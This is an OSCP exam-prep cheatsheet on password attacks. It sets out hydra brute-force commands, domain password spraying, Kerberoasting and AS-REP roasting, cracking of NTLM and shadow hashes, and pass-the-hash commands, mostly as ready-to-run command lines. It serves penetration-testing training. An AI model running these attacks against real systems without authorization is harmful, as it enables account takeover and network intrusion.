# OSCP / OSCP+ Password Attacks Master Cheatsheet 

> **Scope**: Online password attacks (brute-force, spraying, default creds) and offline hash cracking as covered in PEN-200 Module 12 (Password Attacks).
>
> **Official BoK tasks**: Attack SSH/RDP/FTP/WinRM/HTTP logins; crack NTLM/Net-NTLMv2/Linux shadow hashes; pass NTLM hashes; relay Net-NTLMv2; attack password manager key files; attack SSH key passphrases.
>
> **Exam mindset**: Test **default credentials first** (seconds), then **credential reuse**, then **targeted wordlists**, and only then brute-force. Online attacks are noisy and can trigger lockouts; offline cracking has no lockout risk.

---

## Master Table

| # | Technique | How to Identify | Output Validation | Exploitation Steps (Detailed) | Tool Commands | Priority |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | **Default Credential Testing** | Login form, admin panel, CMS, Tomcat Manager, Jenkins, router, database, SSH | Login succeeds with known default pair (e.g., `admin:admin`, `tomcat:tomcat`, `root:root`) | **Step 1**: Identify the service/application (whatweb, banner). **Step 2**: Try the top defaults for that product: `admin:admin`, `admin:password`, `admin:admin123`, `root:root`, `tomcat:tomcat`, `sa:''` (MSSQL), `root:''` (MySQL). **Step 3**: If product-specific (Jenkins, Tomcat, WordPress), check SecLists `default-passwords.csv`. **Step 4**: If login succeeds → pivot to that service's exploitation path | `whatweb http://<target>` ; `grep -i "<product>" /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv` ; manual login attempts | **High** |
| 2 | **Hash Identification** | You have a hash string but do not know the algorithm | `hashid` / `hash-identifier` output shows likely algorithm | **Step 1**: `hashid '<hash>'`. **Step 2**: Confirm by format (32 hex = MD5/NTLM; 40 hex = SHA1; `$6$` = sha512crypt; `$2a$` = bcrypt; `$krb5asrep$` = AS-REP; `$krb5tgs$` = Kerberoast). **Step 3**: Note Hashcat mode (`-m`) | `hashid '5f4dcc3b5aa765d61d8327deb882cf99'` ; `hash-identifier` | **High** |
| 3 | **Wordlist Selection** | Need a password list for cracking or spraying | `rockyou.txt` is the default. SecLists has targeted lists | **Step 1**: Default: `/usr/share/wordlists/rockyou.txt` (14M). **Step 2**: Quick tests: `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`. **Step 3**: Target-specific: generate with `cewl` | `ls /usr/share/wordlists/rockyou.txt` ; `ls /usr/share/seclists/Passwords/Common-Credentials/` | **High** |
| 4 | **Wordlist Generation (CeWL)** | Target website has unique vocabulary (company, product, jargon) | `cewl` output file contains scraped words | **Step 1**: `cewl -w custom.txt -d 4 -m 6 http://<target>/ --lowercase`. **Step 2**: Append common suffixes/years manually. **Step 3**: Use with Hydra or Hashcat | `cewl -w passwords.txt -d 4 -m 6 http://<target>/ --lowercase` | **High** |
| 5 | **Rule/Mask Mutation Workflow** | Wordlist alone is not cracking the hash; need mutations | `hashcat --stdout` previews mutated candidates; cracked hash after rule application | **Step 1**: Preview mutations: `hashcat -r /usr/share/hashcat/rules/best64.rule --stdout rockyou.txt \| head -50`. **Step 2**: Create custom rule (`custom.rule`) with `$1`, `$2`, `$!`, `c` (capitalize) for target-specific patterns (e.g., `Password1!`). **Step 3**: Apply: `hashcat -m <mode> hash.txt rockyou.txt -r custom.rule`. **Step 4**: For known patterns (8 chars, digits), use mask: `hashcat -m <mode> hash.txt -a 3 ?u?l?l?l?l?d?d?d` | `hashcat -r best64.rule --stdout rockyou.txt \| head` ; `hashcat -m 1000 ntlm.txt rockyou.txt -r custom.rule` ; `hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?l?d?d?d` | **High** |
| 6 | **SSH Brute-Force** | SSH port open (22). Lockout policy known or none | Hydra reports `[22][ssh] host: <target> login: <user> password: <pass>` | **Step 1**: Confirm: `nmap -p 22 -sV <target>`. **Step 2**: `hydra -l <user> -P rockyou.txt ssh://<target> -t 4`. **Step 3**: Multiple users: `hydra -L users.txt -P passwords.txt ssh://<target> -t 4`. **Step 4**: SSH in with found creds | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4` | **High** |
| 7 | **FTP Brute-Force** | FTP port open (21). Anonymous login failed | Hydra reports `[21][ftp] host: <target> login: <user> password: <pass>` | **Step 1**: Confirm: `nmap -p 21 -sV <target>`. **Step 2**: `hydra -l <user> -P rockyou.txt ftp://<target> -t 4`. **Step 3**: Login: `ftp <target>` → `USER`/`PASS`. **Step 4**: Download files, check write permissions | `hydra -l admin -P rockyou.txt ftp://<target> -t 4` ; `ftp <target>` | **High** |
| 8 | **RDP Brute-Force** | RDP port open (3389). Lockout policy checked | Hydra reports `[3389][rdp] host: <target> login: <user> password: <pass>` | **Step 1**: Confirm: `nmap -p 3389 -sV <target>`. **Step 2**: `hydra -l <user> -P rockyou.txt rdp://<target> -t 4`. **Step 3**: Connect: `xfreerdp /u:<user> /p:<pass> /v:<target>` | `hydra -l admin -P rockyou.txt rdp://<target> -t 4` ; `xfreerdp /u:<user> /p:<pass> /v:<target>` | Medium |
| 9 | **WinRM Password Spraying** | WinRM port open (5985/5986). Domain userlist available | `nxc winrm` output shows `[+] <domain>\<user>:<pass>` and `Pwn3d!` | **Step 1**: Check lockout: `nxc smb <DC> -u <user> -p <pass> --pass-pol`. **Step 2**: Spray: `nxc winrm <target> -u users.txt -p 'Password123' --continue-on-success`. **Step 3**: If `Pwn3d!`: `evil-winrm -i <target> -u <user> -p '<pass>'` | `nxc winrm <target> -u users.txt -p 'Password123' --continue-on-success` | **High** |
| 10 | **HTTP POST Form Brute-Force** | Login form (`/login.php`, `/wp-login.php`) returns distinct failure message | Hydra reports `[80][http-post-form] host: <target> login: <user> password: <pass>` | **Step 1**: Capture failed login in Burp. **Step 2**: Identify the **exact failure string** in the response (e.g., `Invalid credentials`, `Login failed`, `Incorrect password`). **Step 3**: Build Hydra: `hydra -l <user> -P rockyou.txt http-post-form://<target>/login.php:'username=^USER^&password=^PASS^':'F=<exact_failure_string>'`. **Step 4**: If success string is shorter, use `S=<success_string>` instead of `F=`. **Step 5**: URL-encode special chars in the failure string if needed | `hydra -l admin -P rockyou.txt http-post-form://<target>/login.php:'u=^USER^&p=^PASS^':'F=Invalid credentials'` | **High** |
| 11 | **Domain Password Spraying** | Domain userlist available. Lockout policy known | `nxc smb` output shows `[+] domain\user:pass`; `Pwn3d!` for admin | **Step 1**: Get lockout policy: `nxc smb <DC> -u <user> -p <pass> --pass-pol`. **Step 2**: Spray one password across userlist: `nxc smb <IP> -u users.txt -p 'Welcome1' --continue-on-success`. **Step 3**: Repeat with other common passwords (respect lockout count) | `nxc smb <IP> -u users.txt -p 'Welcome1' --continue-on-success` | **High** |
| 12 | **Kerbrute User Enumeration** | Kerberos port 88 open (Domain Controller) | `kerbrute` output shows `VALID USERNAME: <user>` | **Step 1**: `kerbrute userenum -d <domain> --dc <target> users.txt`. **Step 2**: Collect valid usernames. **Step 3**: Use for AS-REP Roasting or spraying | `kerbrute userenum -d domain.local --dc <target> users.txt` | **High** |
| 13 | **NTLM Hash Cracking** | NTLM hash from SAM/LSASS/Mimikatz | Hashcat reports `Status: Cracked` | **Step 1**: `hashcat -m 1000 ntlm.txt rockyou.txt`. **Step 2**: Add rules: `-r best64.rule`. **Step 3**: Use cracked password for lateral movement / PtH | `hashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule` | **High** |
| 14 | **Net-NTLMv2 Cracking** | Net-NTLMv2 hash captured via Responder/Inveigh | Hashcat reports `Status: Cracked` | **Step 1**: Capture with Responder. **Step 2**: `hashcat -m 5600 netntlmv2.txt rockyou.txt`. **Step 3**: Use plaintext for lateral movement | `hashcat -m 5600 captured.txt rockyou.txt` | **High** |
| 15 | **AS-REP Roasting (Crack)** | `impacket-GetNPUsers` returned `$krb5asrep$` hashes | Hashcat reports `Status: Cracked` | **Step 1**: `impacket-GetNPUsers <domain>/ -dc-ip <DC> -usersfile users.txt -no-pass -request`. **Step 2**: `hashcat -m 18200 asrep.txt rockyou.txt`. **Step 3**: Use cracked password for domain auth | `hashcat -m 18200 asrep.txt rockyou.txt` | **High** |
| 16 | **Kerberoasting (Crack)** | `impacket-GetUserSPNs` returned `$krb5tgs$` hashes | Hashcat reports `Status: Cracked` | **Step 1**: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request`. **Step 2**: `hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule`. **Step 3**: Use cracked service account password | `hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule` | **High** |
| 17 | **Linux `/etc/shadow` Cracking** | Readable `/etc/shadow` (via LFI, misconfiguration, or root) | `john` reports cracked passwords for shadow entries | **Step 1**: Get `/etc/passwd` and `/etc/shadow`. **Step 2**: `unshadow passwd.txt shadow.txt > unshadowed.txt`. **Step 3**: `john --wordlist=rockyou.txt unshadowed.txt`. **Step 4**: `john --show unshadowed.txt` to display. **Step 5**: Use cracked passwords for `su`/`ssh` | `unshadow passwd.txt shadow.txt > unshadowed.txt` → `john --wordlist=rockyou.txt unshadowed.txt` | **High** |
| 18 | **John the Ripper (Format-Specific)** | Hash type has a `*2john` helper (SSH key, ZIP, PDF, Office, KeePass) | John reports `passwordname (filename)` or cracks passphrase | **Step 1**: Extract: `ssh2john id_rsa > ssh.hash` / `zip2john file.zip > zip.hash` / `office2john file.docx > office.hash` / `keepass2john db.kdbx > keepass.hash`. **Step 2**: `john --wordlist=rockyou.txt ssh.hash`. **Step 3**: `john --show ssh.hash` | `ssh2john id_rsa > ssh.hash` → `john --wordlist=rockyou.txt ssh.hash` | Medium |
| 19 | **Password Manager Key File Attack** | KeePass `.kdbx` found; associated `.key` file may exist | `keepass2john` extracts crackable hash | **Step 1**: `find / -name "*.kdbx" 2>/dev/null`. **Step 2**: `keepass2john database.kdbx > keepass.hash`. **Step 3**: `john --wordlist=rockyou.txt keepass.hash`. **Step 4**: Open with cracked password | `keepass2john database.kdbx > keepass.hash` → `john --wordlist=rockyou.txt keepass.hash` | Medium |
| 20 | **SSH Key Passphrase Attack** | Private key (`id_rsa`) found but encrypted | `ssh2john` extracts crackable hash | **Step 1**: `ssh2john id_rsa > ssh.hash`. **Step 2**: `john --wordlist=rockyou.txt ssh.hash`. **Step 3**: `ssh -i id_rsa <user>@<target>` with cracked passphrase | `ssh2john id_rsa > ssh.hash` → `john --wordlist=rockyou.txt ssh.hash` | Medium |
| 21 | **Pass-the-Hash (PtH)** | NTLM hash but no plaintext | `nxc smb -H <hash>` returns `Pwn3d!` | **Step 1**: `nxc smb <target> -u <user> -H <NTLM>`. **Step 2**: `psexec.py <domain>/<user>@<target> -hashes :<NTLM>`. **Step 3**: Or `evil-winrm -i <target> -u <user> -H <NTLM>` | `impacket-psexec <domain>/<user>@<target> -hashes :<NTLM>` | **High** |

---

## Output Validation Summary

- **Default creds**: Login succeeds with `admin:admin` / `tomcat:tomcat` / `root:root` → immediate access.
- **`hashid`**: Returns `Most likely <algorithm>` → map to Hashcat mode.
- **`hashcat --stdout`**: Preview of mutated candidates → confirm rule is working before cracking.
- **`hydra`**: `[<port>][<service>] host: <target> login: <user> password: <pass>` → valid credentials.
- **`nxc smb --pass-pol`**: Lockout threshold returned → adjust spray count.
- **`nxc winrm --continue-on-success`**: `[+] domain\user:pass` → valid credential; `Pwn3d!` → admin.
- **`kerbrute userenum`**: `VALID USERNAME: <user>` → build userlist.
- **`unshadow` + `john`**: `password (username)` → cracked Linux password.
- **`hashcat`**: `Status: Cracked` + `Hash.Target` → plaintext recovered.
- **`john --show`**: Displays cracked passwords for the hash file.

---

## Password Attack Workflow

1. **Test default credentials first** (seconds) → `admin:admin`, `tomcat:tomcat`, `root:root`.
2. **Identify what you have**: usernames? hashes? service access? → choose online vs offline.
3. **Online**: Check lockout policy (`nxc smb --pass-pol`). Prefer **spraying** over brute-force.
4. **Offline**: `hashid` → Hashcat mode → `rockyou.txt` → rules/mask if needed.
5. **Linux shadow**: `unshadow` → `john` → `su`/`ssh`.
6. **Kerberos**: `kerbrute` → AS-REP/Kerberoast → crack → reuse.
7. **Cracked credentials**: Test against all reachable services (SSH, WinRM, RDP, FTP, SMB, web, DB).
8. **Hashes without plaintext**: Use **Pass-the-Hash** (NTLM) or **relay** (Net-NTLMv2).

---

## Quick Command Reference

| Purpose | Command |
| :--- | :--- |
| Default creds (SecLists) | `grep -i "<product>" /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv` |
| Hash identification | `hashid '<hash>'` / `hash-identifier` |
| Wordlist (default) | `/usr/share/wordlists/rockyou.txt` |
| Wordlist generation | `cewl -w custom.txt -d 4 -m 6 http://<target>/ --lowercase` |
| Rule preview | `hashcat -r best64.rule --stdout rockyou.txt \| head -50` |
| Custom rule application | `hashcat -m 1000 ntlm.txt rockyou.txt -r custom.rule` |
| Mask attack | `hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?l?d?d?d` |
| SSH brute-force | `hydra -l <user> -P rockyou.txt ssh://<target> -t 4` |
| FTP brute-force | `hydra -l <user> -P rockyou.txt ftp://<target> -t 4` |
| RDP brute-force | `hydra -l <user> -P rockyou.txt rdp://<target> -t 4` |
| WinRM spray | `nxc winrm <target> -u users.txt -p 'Password123' --continue-on-success` |
| HTTP POST brute-force | `hydra -l <user> -P rockyou.txt http-post-form://<target>/login:'u=^USER^&p=^PASS^':'F=Invalid credentials'` |
| Domain spray | `nxc smb <IP> -u users.txt -p 'Welcome1' --continue-on-success` |
| Lockout policy check | `nxc smb <DC> -u <user> -p <pass> --pass-pol` |
| Kerbrute user enum | `kerbrute userenum -d domain.local --dc <target> users.txt` |
| NTLM crack | `hashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule` |
| Net-NTLMv2 crack | `hashcat -m 5600 captured.txt rockyou.txt` |
| AS-REP crack | `hashcat -m 18200 asrep.txt rockyou.txt` |
| Kerberoast crack | `hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule` |
| Linux shadow crack | `unshadow passwd.txt shadow.txt > unshadowed.txt` → `john --wordlist=rockyou.txt unshadowed.txt` |
| SSH key passphrase crack | `ssh2john id_rsa > ssh.hash` → `john --wordlist=rockyou.txt ssh.hash` |
| KeePass crack | `keepass2john database.kdbx > keepass.hash` → `john --wordlist=rockyou.txt keepass.hash` |
| ZIP/Office/PDF crack | `zip2john` / `office2john` / `pdf2john` → `john --wordlist=rockyou.txt <hash>` |
| Pass-the-Hash (psexec) | `impacket-psexec <domain>/<user>@<target> -hashes :<NTLM>` |
| Pass-the-Hash (winrm) | `evil-winrm -i <target> -u <user> -H <NTLM>` |

---

## Exam Rules (Password-Specific)

- **Default credentials first**: Test product defaults before any brute-force. It takes seconds.
- **Lockout awareness**: Always check `nxc smb --pass-pol` before spraying. Respect the threshold.
- **Hydra is allowed**: Online brute-force is permitted, but noisy. Use `-t 4`.
- **Hashcat/John are allowed**: Offline cracking has no exam restrictions.
- **Failure-string discovery**: For HTTP POST Hydra, capture a failed login in Burp and copy the exact failure string. Do not guess.
- **Credential reuse is key**: A cracked password for one service often works on others. Test everywhere.

---

## GitHub Usage Tips

1. Save as `OSCP-Password-Attacks-Cheatsheet.md`
2. Keep `\|` escapes in Markdown tables
3. Branch per practice target (e.g., `git checkout -b htb-blue`)
4. Pair with the AD checklist—cracked credentials feed directly into lateral movement
